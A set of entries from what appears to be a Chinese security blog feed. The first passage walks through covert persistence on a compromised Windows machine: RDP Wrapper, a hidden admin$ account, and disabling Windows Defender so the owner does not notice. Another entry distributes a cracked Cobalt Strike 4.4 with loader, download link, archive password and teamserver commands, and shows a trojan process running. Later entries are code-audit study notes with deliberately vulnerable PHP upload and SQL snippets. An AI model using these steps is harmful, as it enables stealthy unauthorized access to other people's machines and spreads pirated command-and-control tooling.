<h1 id="第三阶段-多用户远程登录同一用户"><a href="#第三阶段-多用户远程登录同一用户" class="headerlink" title="第三阶段-多用户远程登录同一用户"></a>第三阶段-多用户远程登录同一用户</h1><p><strong>你在拿到对方机子登录他账号总是会挤掉对方很容易暴露，所以为了让自己不会那么快被发现可以使用这个方法，这时我通过百度发现了一个很强的工具，可以帮助我们快速建立</strong></p>
<p><a href="https://github.com/asmtron/rdpwrap" target="_blank" rel="noopener">https://github.com/asmtron/rdpwrap</a></p>
<p>下载工具之后 <strong>提示：踩坑出来的建议，要严谨 不然不会成功</strong></p>
<p><strong>第一步、仔细看看这个说明</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;asmtron&#x2F;rdpwrap&#x2F;blob&#x2F;master&#x2F;binary-download.md</span><br><span class="line"></span><br><span class="line">安装 RDP 包装器和自动更新器</span><br><span class="line">下载“RDPWrap-v1.6.2.zip” LINK#1或LINK#2并将所有文件解压到“%ProgramFiles%\RDP Wrapper”目录</span><br><span class="line"></span><br><span class="line">不要使用其他目录来安装&#x2F;提取 RDP 包装文件。仅使用“%ProgramFiles%\RDP Wrapper”目录（通常为 C:\Program Files\RDP Wrapper）</span><br><span class="line"></span><br><span class="line">下载autoupdate.zip并将所有文件解压到“%ProgramFiles%\RDP Wrapper”目录</span><br><span class="line"></span><br><span class="line">要在系统启动时启用 autoupdate.bat 的自动运行，请以管理员身份运行以下帮助程序批处理文件：</span><br><span class="line"></span><br><span class="line">&quot;%ProgramFiles%\RDP Wrapper\helper\autoupdate__enable_autorun_on_startup.bat&quot;</span><br><span class="line"></span><br><span class="line">在您的防病毒软件或 Windows Defender 中设置文件夹“%ProgramFiles%\RDP Wrapper”的排除项，以防止删除 RDP Wrapper 文件</span><br><span class="line"></span><br><span class="line">现在您可以使用自动更新批处理文件来安装和更新 RDP 包装器。请以管理员身份运行 autoupdate.bat：</span><br><span class="line"></span><br><span class="line">&quot;%ProgramFiles%\RDP Wrapper\autoupdate.bat&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>第二步、将其压缩到上述说明的步骤上</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031171653350.png" alt="image-20211031171653350"></p>
</blockquote>
<p><strong>第三步、以管理员权限运行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031171822394.png" alt="image-20211031171822394"></p>
</blockquote>
<p><strong>第四步、关掉windows defence</strong></p>
<p>工具下载地址<a href="https://www.sordum.org/9480/defender-control-v1-9/" target="_blank" rel="noopener">https://www.sordum.org/9480/defender-control-v1-9/</a></p>
<p>直接运行就可以关掉defence</p>
<p><strong>第五步以管理员权限运行autoupdate.bat需要等待很久 中途会断连几次</strong>，因为是连接国外的github进行连接  大家有兴趣可以改另一个链接会快一些</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031172134253.png" alt="image-20211031172134253"></p>
</blockquote>
<p>因为没挂vpn经过漫长的等待，打开RDPConf.exe就看到全部是绿色的钩子，就说明你成功了。我们来实验一下</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031173349537.png" alt="image-20211031173349537"></p>
<h1 id="第四阶段-测试多用户登录"><a href="#第四阶段-测试多用户登录" class="headerlink" title="第四阶段-测试多用户登录"></a>第四阶段-测试多用户登录</h1><hr>
<p><strong>第一个阶段我们创建了一个admin$的用户，现在已经完成，直接可以多用户登陆admin$而不会将其挤掉，并且对方还查不到，这样不就好玩了么</strong></p>
<p><strong>——注意：配置记得改成我这样，将single Remote Desktop取消掉</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031175036826.png" alt="image-20211031175036826"></p>
</blockquote>
<p><strong>last - one 最终完成</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211031175236336.png" alt="image-20211031175236336"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a><a href="http://gylq.gitee.io">我的个人博客</a></h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控工具】CobaltStrike 4.4原版白嫖破解及汉化加载器</title>
    <url>/posts/173.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>面已经发过关于cobalt strike4.4的破解版本和源码,但是破解不完整,存在问题.</p>
<p>今天的这一篇文章使用官方原版和CSAgent来破解cobalt strike4.4,且自带汉化功能</p>
<h2 id="CobaltStrike-4-4"><a href="#CobaltStrike-4-4" class="headerlink" title="CobaltStrike 4.4"></a>CobaltStrike 4.4</h2><p><img src="https://gylq.gitee.io/cloudimages/img/image-20211019193550449.png" alt=""></p>
<p>为了保住软件的安全性，我们校验一下sha256</p>
<p>cobaltstrike.jar sha256校验码:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">7af9c759ac78da920395debb443b9007fdf51fa66a48f0fbdaafb30b00a8a858</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211019194124387.png" alt=""></p>
</blockquote>
<p>官网sha256校验码:</p>
<p>官网校验地址:</p>
<p><a href="https://verify.cobaltstrike.com/" target="_blank" rel="noopener">https://verify.cobaltstrike.com/</a></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211019195254218.png" alt=""></p>
<p><strong>sha256校验码一致,说明文件为官网版本(原版)</strong></p>
<h1 id="CSAgent介绍"><a href="#CSAgent介绍" class="headerlink" title="CSAgent介绍"></a>CSAgent介绍</h1><p>使用CSAgent加载器破解可以汉化4.x全版本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">4.0 1be5be52c6255c33558e8a1cb667cb06</span><br><span class="line">4.1 80e32a742060b884419ba0c171c9aa76</span><br><span class="line">4.2 b20d487addd4713418f2d5a3ae02a7a0</span><br><span class="line">4.3 3a4425490f389aeec312bdd758ad2b99</span><br><span class="line">4.4 5e98194a01c6b48fa582a6a9fcbb92d6</span><br></pre></td></tr></table></figure></div>

<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址:"></a>项目地址:</h3><p>GitHub: <a href="https://github.com/Twi1ight/CSAgent" target="_blank" rel="noopener">github.com/Twi1ight/CSAgent</a></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CobaltStrike 4.x通用白嫖及汉化加载器</p>
<p>采用javaagent+javassist的方式动态修改jar包，可直接加载原版cobaltstrike.jar，理论上支持到目前为止的所有4.x版本</p>
<p><strong>PS</strong>：汉化原理部分代码白嫖于外面公开的汉化版本，非我原创</p>
<p>这可能是迄今为止最全面、最详细、最牛逼的汉化版本，主要体现在：</p>
<ol>
<li>汉化内容更详细，非机翻，所有文字是我一句句人工翻译的，不只简单的汉化了菜单，各类错误、说明信息都有汉化，尤其是用正则表达式覆盖了各类动态生成的错误信息</li>
<li>汉化范围更全面，之前的各类汉化版都是没有完全汉化按钮的，因为这里涉及到java的一个坑，汉化后可能导致按钮功能失效，本版本对所有按钮全覆盖； 另外，针对Beacon终端交互内的命令及命令帮助也都有详尽的汉化说明，部分命令还加上了我个人的说明见解</li>
<li>汉化方式更先进，并非纯粹的正则替换，针对菜单、命令、命令帮助说明的汉化利用了Cobalt Strike加载资源文件的特性，直接翻译资源文件即可，无需再做动态替换，性能更高，后续版本更新也更方便 针对界面的各类说明、标签汉化，全部写入配置文件中，后续版本只需修改这部分配置即可，无需再修改java代码</li>
</ol>
<h2 id="CobaltStrike-4-4汉化版功能完整破解下载地址"><a href="#CobaltStrike-4-4汉化版功能完整破解下载地址" class="headerlink" title="CobaltStrike 4.4汉化版功能完整破解下载地址"></a>CobaltStrike 4.4汉化版功能完整破解下载地址</h2><p>源文件文件内容为 cobaltstrike.jar</p>
<p>云中转网盘:<br><a href="https://www.yunzhongzhuan.com/#sharefile=l6RwhAUR_14444" target="_blank" rel="noopener">https://www.yunzhongzhuan.com/#sharefile=l6RwhAUR_14444</a></p>
<p>解压密码：gylq.gitee.io</p>
<h3 id="Windows下直接双击cobaltstrike-bat即可运行"><a href="#Windows下直接双击cobaltstrike-bat即可运行" class="headerlink" title="Windows下直接双击cobaltstrike.bat即可运行"></a>Windows下直接双击cobaltstrike.bat即可运行</h3><p>cobaltstrike.bat内容为:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar&#x3D;5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language&#x3D;en -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure></div>

<h3 id="①服务器端配置"><a href="#①服务器端配置" class="headerlink" title="①服务器端配置"></a>①服务器端配置</h3><p>在服务端相同放置文件并,chmod +x,chmod 777 [总之就是给权限]</p>
<p>输入以下命令后即可正常使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver 192.168.xx.xx ddosi.org</span><br></pre></td></tr></table></figure></div>

<p><strong>./teamserver 服务器ip 设置的cs密码</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211019195234989.png" alt=""></p>
<p>服务器端已经正常运行.</p>
<h3 id="②在客户端填入自己服务端的ip-端口-密码即可连接"><a href="#②在客户端填入自己服务端的ip-端口-密码即可连接" class="headerlink" title="②在客户端填入自己服务端的ip,端口,密码即可连接"></a>②在客户端填入自己服务端的ip,端口,密码即可连接</h3><p><img src="https://gylq.gitee.io/cloudimages/img/image-20211019195636396.png" alt="image-20211019195636396"></p>
<p>连接成功后看到界面为中文的,这是CSAgent作者的功劳.</p>
<h3 id="⑥Linux下启动和Windows是一样的命令"><a href="#⑥Linux下启动和Windows是一样的命令" class="headerlink" title="⑥Linux下启动和Windows是一样的命令"></a>⑥Linux下启动和Windows是一样的命令</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;cobaltstrike</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211019200224363.png" alt="image-20211019200224363"></p>
</blockquote>
<h2 id="CobaltStrike-4-4破解版运行测试"><a href="#CobaltStrike-4-4破解版运行测试" class="headerlink" title="CobaltStrike 4.4破解版运行测试"></a>CobaltStrike 4.4破解版运行测试</h2><p>木马进程:</p>
<blockquote>
<img src="https://gylq.gitee.io/cloudimages/img/image-20211019201218155.png" alt="image-20211019201218155" style="zoom:150%;" />
</blockquote>
<p>命令执行正常</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211019201825464.png" alt="image-20211019201825464"></p>
<p>其他功能自行测试</p>
<p>安全起见,此类红队工具”破解版本”建议放虚拟机运行</p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
        <tag>cracked</tag>
        <tag>远控工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【代码审计】任意文件操作简单学习审计和分析</title>
    <url>/posts/174.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>代码审计学习记录</li>
</ul>
</blockquote>
<h1 id="PHP文件操作函数汇总"><a href="#PHP文件操作函数汇总" class="headerlink" title="PHP文件操作函数汇总"></a>PHP文件操作函数汇总</h1><ul>
<li><p><strong>-文件包含</strong></p>
<ul>
<li>– include/require/include_once/require_once/spl_autoload</li>
</ul>
</li>
<li><p><strong>-文件读取</strong></p>
<ul>
<li>– file_get_contents/fread/readfile/file/highlight_file/show_source</li>
</ul>
</li>
<li><p><strong>-文件写入</strong></p>
<ul>
<li>– file_put_contents/fwrite/mkdir/fputs</li>
</ul>
</li>
<li><p><strong>-文件删除</strong></p>
<ul>
<li>– unlink/rmdir</li>
</ul>
</li>
<li><p><strong>-文件上传</strong></p>
<ul>
<li>– move_uploaded_file/copy/rename</li>
</ul>
</li>
</ul>
<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><ul>
<li><p>-<strong>文件上传流程</strong></p>
<ul>
<li>– 检查文件大小、后缀、类型</li>
<li>– 检查文件内容（如图片头等）</li>
<li>– 提取文件后缀</li>
<li>– 生成新文件名</li>
<li>– 将上传临时文件拷贝到新文件名位置</li>
</ul>
</li>
<li><p>-<strong>文件上传逻辑常见错误</strong></p>
<ul>
<li>– 只检查文件类型不检查文件后缀</li>
<li>– 文件后缀黑名单导致遗漏</li>
<li>– 使用原始文件名，导致\0截断等漏洞</li>
</ul>
</li>
<li><p>-<strong>文件上传之什么也没过滤的情况</strong></p>
</li>
<li><p>-案例：<a href="https://php.mengsec.com/bugs/wooyun-2015-0125592.html" target="_blank" rel="noopener">泛微Eoffice 三处任意文件上传可直接getshell</a> </p>
</li>
<li><p>-<strong>特点</strong>：</p>
<ul>
<li>– 常见于路由设备、内部平台等</li>
<li>– 可使用扫描器批量发现</li>
</ul>
</li>
<li><p>-文件上传之Mime Type 检查的绕过</p>
</li>
<li><p>-案例：<a href="https://php.mengsec.com/bugs/wooyun-2014-048841.html" target="_blank" rel="noopener">建站之星任意文件上传漏洞1</a></p>
</li>
<li><p>-特点：</p>
<ul>
<li>– 上传时检查Mime-Type, 不检查文件后缀</li>
<li>– 或用Mime-Type生成文件后缀</li>
<li>– 利用：修改数据包中的Mime-Type</li>
<li>– 可使用扫描器批量发现</li>
</ul>
<p><strong>测试代码（上传文件到当前目录）</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_FILES);</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'x'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span>.$_FILES[<span class="string">'x'</span>][<span class="string">'name'</span>]);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211017151158386.png" alt="image-20211017151158386"></p>
</blockquote>
</li>
<li><p>-文件上传没有重命名文件的后果</p>
</li>
<li><p>-案例：<a href="https://php.mengsec.com/bugs/wooyun-2014-048760.html" target="_blank" rel="noopener">建站之星任意文件上传漏洞2</a></p>
</li>
<li><p>-特点：</p>
<ul>
<li>– 从POST变量中获取文件名（目录名）</li>
<li>– 服务端语言不检查 \0</li>
<li>– 不重命名文件，导致\0进入操作系统</li>
<li>– 截断文件名，留下xxx.php</li>
</ul>
</li>
</ul>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a><a href="http://gylq.gitee.io">我的个人博客</a></h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】百度云如何使用IDM和脚本在线不限速下载</title>
    <url>/posts/171.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="安装百度云简易下载助手脚本使用方法"><a href="#安装百度云简易下载助手脚本使用方法" class="headerlink" title="安装百度云简易下载助手脚本使用方法"></a>安装百度云简易下载助手脚本使用方法</h1><p>油猴是必备的。这个大家应该都知道</p>
<p>脚本下载地址：<a href="https://greasyfork.org/zh-CN/scripts/418182-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%AE%80%E6%98%93%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B-%E7%9B%B4%E9%93%BE%E4%B8%8B%E8%BD%BD%E5%A4%8D%E6%B4%BB%E7%89%88" target="_blank" rel="noopener">百度云简易下载助手</a></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014145529596.png" alt="image-20211014145529596"></p>
</blockquote>
<p>这里可以看看效果</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014145755256.png" alt="image-20211014145755256"></p>
</blockquote>
<p>然后复制链接</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014194835432.png" alt="image-20211014194835432"></p>
</blockquote>
<h1 id="IDM"><a href="#IDM" class="headerlink" title="IDM"></a>IDM</h1><p><em>注：如果你已经有IDM了，那用你自己的就行了，无需下载我提供的版本</em><br><strong>IDM下载</strong>：<a href="https://wwx.lanzoux.com/b01nqc7yj" target="_blank" rel="noopener">https://wwx.lanzoux.com/b01nqc7yj</a><br>我提供的IDM是绿色版本，解压后，执行“!)绿化.bat”，就可以正常使用了。<br><strong>IDM配置</strong>：设置4线程及修改UA为 softxm;netdisk</p>
<p>新建下载任务后，不要立刻下载，先等待出现正常文件图标时，再进行下载！</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014160018032.png" alt="image-20211014160018032"></p>
</blockquote>
<p>接着打开idm界面点击新建任务，他会自动添加链接，然后等待图标显示就可以下载了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014150010838.png" alt="image-20211014150010838"></p>
</blockquote>
<p>下载速度展示我手机的wifi网，就可以达到3-5MB/s</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014150246257.png" alt="image-20211014150246257"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
      </tags>
  </entry>
  <entry>
    <title>【代码审计】SQL注入简单学习审计和分析</title>
    <url>/posts/172.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>代码审计学习记录</li>
</ul>
</blockquote>
<h1 id="代码审计流程"><a href="#代码审计流程" class="headerlink" title="代码审计流程"></a>代码审计流程</h1><ul>
<li><p><strong>-反向查找流程</strong></p>
<ul>
<li>–通过可控变量（输入点）回溯危险函数</li>
<li>–查找危险函数确定可控变量</li>
<li>–传递的过程中触发漏洞</li>
</ul>
</li>
<li><p><strong>-案例</strong></p>
<ul>
<li>–<a href="https://bugs.leavesongs.com/php/z-blog-blind-xxe%E9%80%A0%E6%88%90%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" target="_blank" rel="noopener">Z-BLOG-Blind-XXE造成任意文件读取</a></li>
</ul>
</li>
<li><p><strong>-反向查找流程特点</strong></p>
<ul>
<li>–上下文无关</li>
<li>–危险函数，调用即漏洞</li>
</ul>
</li>
<li><p><strong>-使用反向查找流程挖掘漏洞</strong></p>
<ul>
<li>–危险函数全局查找</li>
<li>–自动化审计工具（RISP，VCG，Fortify SCA，Cobra，grepbugs，Sky wolf， Taint）</li>
</ul>
</li>
<li><p><strong>-根源</strong>：危险函数导致漏洞</p>
</li>
<li><p><strong>-特点</strong>：</p>
<ul>
<li>–暴力：全局搜索危险函数</li>
<li>–简单：无需过多理解目标网站功能与架构</li>
<li>–快速：适用于自动化代码审计工具</li>
<li>–命中率低：简单的漏洞越来越少</li>
<li>–无法挖掘逻辑漏洞：逻辑漏洞多数不存在危险函数，或危险函数的参数“看似”不可控</li>
<li>–适应性交叉：不适合存在全局过滤的站点</li>
</ul>
</li>
<li><p>-<strong>正向查找流程</strong>（MVC架构 Model View Controller）<strong>Controller主要分发处理请求逻辑，Model专门处理数据库相关操作，View显示给用户的一些内容</strong></p>
<ul>
<li>– 从入口点函数出发</li>
<li>– 找到控制器，理解URL派发规则</li>
<li>– 跟踪控制器调用，以理解代码为目标</li>
<li>– 阅读代码的过程中，可能发现漏洞</li>
</ul>
</li>
<li><p>-案例</p>
<ul>
<li>– PHPCMS v9.6.0 前台GetShell漏洞</li>
</ul>
</li>
<li><p>-根源：程序员疏忽或逻辑问题导致漏洞</p>
</li>
<li><p>-特点：</p>
<ul>
<li>– 复杂：需要及其了解目标源码的功能与架构</li>
<li>– 跳跃性大： 涉及M/V/C/Service/Dao等多个层面</li>
<li>– 漏洞的组合：通常是多个漏洞的组合，很可能存在逻辑相关的漏洞</li>
<li>– 潜力无限：安全研究人员的宝库</li>
</ul>
</li>
<li><p>-<strong>双向查找流程</strong></p>
<ul>
<li>– 阅读代码，了解架构</li>
<li>– 是否有全局过滤机制？<ul>
<li>— 有：是否可以绕过？<ul>
<li>—- 可以：寻找漏洞触发点</li>
<li>—- 不可以： 寻找没有过滤的变量</li>
</ul>
</li>
<li>— 没有：那么它是如何处理的？<ul>
<li>—- 完全没有处理：可以挖成筛子</li>
<li>—- 有处理：寻找遗漏的处理点</li>
</ul>
</li>
</ul>
</li>
<li>– 找到了漏洞点，漏洞利用是否有坑？<ul>
<li>— 否：成功利用！</li>
<li>— 是：利用所知的语言知识（trick）解决问题。</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014095411276.png" alt="image-20211014095411276"></p>
</blockquote>
<ul>
<li>-根源：理解程序执行过程，找寻危险逻辑</li>
<li>-特点：<ul>
<li>– 高效：如挖隧道，双向开工，时间减半</li>
<li>– 知识面广：需要同时掌握正向，反向挖掘技巧，并进行结合</li>
<li>– 以及所有正向、反向的优点</li>
</ul>
</li>
</ul>
<h1 id="PHP-SQL注入漏洞挖掘技巧"><a href="#PHP-SQL注入漏洞挖掘技巧" class="headerlink" title="PHP-SQL注入漏洞挖掘技巧"></a>PHP-SQL注入漏洞挖掘技巧</h1><ul>
<li><p>-PHP+Mysql连接方法</p>
<ul>
<li>– Mysql（废弃）</li>
<li>– Mysqli</li>
<li>– PDO</li>
</ul>
</li>
<li><p>-SQL注入漏洞常见过滤方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">-- intval &#x2F; addslashes &#x2F; mysql_real_escape</span><br><span class="line"></span><br><span class="line">-- mysqli_escape_string &#x2F; mysqli_real_escape_string &#x2F; mysqli::escape_string</span><br><span class="line"></span><br><span class="line">-- PDO::quote</span><br><span class="line"></span><br><span class="line">-- 参数化查询</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>-<strong>addslashes / mysql_real_escape</strong></p>
<ul>
<li>– 宽字符注入</li>
<li>– 寻找字符串转换函数<ul>
<li>— urldecode</li>
<li>— base64_decode</li>
<li>— iconv</li>
<li>— json_decode</li>
<li>— stripshasles</li>
<li>— simple_xml_loadstring</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$id  = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">// ' ==&gt; \'</span></span><br><span class="line"><span class="comment">// \ ==&gt; \\</span></span><br><span class="line"><span class="comment">// " ==&gt; \"</span></span><br><span class="line"><span class="comment">// \x00 ==&gt; \0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql =  <span class="string">"SELECT * FROM dual WHERE id = '$id';"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>-mysqli::escape_string / PDO::quote</strong></p>
<ul>
<li>– 与addslashes差别： 是否会主动加引号包裹</li>
<li>– 宽字节注入</li>
</ul>
</li>
<li><p>-<strong>参数化查询</strong></p>
<ul>
<li>– 寻找非sql值的位置</li>
<li>– SELECT name from users where id = ? ORDER BY Login_time Limit 1</li>
</ul>
</li>
<li><p>-案例：贷齐乐系统header注入</p>
</li>
<li><p>-略读代码，了解架构</p>
<ul>
<li>– 非MVC架构</li>
<li>– 全局GPC转义</li>
</ul>
</li>
<li><p>-目标：找到没有进行过滤的输入点</p>
</li>
<li><p>-结果：$<em>SERVER[HTTP\</em>*]均无过滤导致注入</p>
</li>
<li><p>-入手点</p>
<ul>
<li>– 开发者不熟悉的边缘功能</li>
<li>– 常被复制粘贴代码的功能</li>
</ul>
</li>
<li><p>-案例：<a href="https://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2014-077877" target="_blank" rel="noopener">ThinkSNS某版本SQL注入漏洞</a></p>
</li>
<li><p>-略读代码，了解架构</p>
<ul>
<li>– 基于ThinkPHP3.1开发</li>
<li>– MVC架构</li>
<li>– 利用t函数过滤变量</li>
</ul>
</li>
<li><p>-目标：找到t函数过滤完成以后也可以注入的点</p>
</li>
<li><p>-结果：表名位置SQL注入漏洞</p>
</li>
<li><p>-案例：Metinfo企业网站管理系统SQL注入漏洞</p>
</li>
<li><p>-略读代码，了解架构</p>
<ul>
<li>– 非MVC架构</li>
<li>– 全局覆盖的方式注册变量</li>
<li>– 全局GPC转义</li>
</ul>
</li>
<li><p>-目标：获取绕过全局GPC的方法</p>
</li>
<li><p>-结果：利用base64_decode来引入单引号</p>
</li>
</ul>
<h1 id="上方部分总结"><a href="#上方部分总结" class="headerlink" title="上方部分总结"></a>上方部分总结</h1><ul>
<li>-开发者容易遗漏的输入点</li>
<li>-HTTP头<ul>
<li>– X-Forwarded-For</li>
<li>– User-Agent</li>
<li>– Referer</li>
</ul>
</li>
<li>-PHP_SELF</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014201202526.png" alt="image-20211014201202526"></p>
</blockquote>
<ul>
<li>-REQUEST_URI</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211014201315915.png" alt="image-20211014201315915"></p>
</blockquote>
<ul>
<li><p>-文件名 $_FILES[][name]</p>
</li>
<li><p>-php://input</p>
</li>
<li><p>-引入单引号（转义符）的方法</p>
<ul>
<li>– stripslashes #（<em>&#39;</em> 转换为 <em>‘</em> 等等）</li>
<li>– base64_decode</li>
<li>– urldecode</li>
<li>– substr</li>
<li>– iconv</li>
<li>– str_replace(‘0’,’’,$sql)</li>
<li>– xml</li>
<li>– json_encode</li>
</ul>
</li>
</ul>
<h1 id="简单分析SQL注入的诱因"><a href="#简单分析SQL注入的诱因" class="headerlink" title="简单分析SQL注入的诱因"></a>简单分析SQL注入的诱因</h1><h2 id="前言配置"><a href="#前言配置" class="headerlink" title="前言配置"></a>前言配置</h2><p>我的common.php中配置</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20211016085311962.png" alt="image-20211016085311962"></p>
</blockquote>
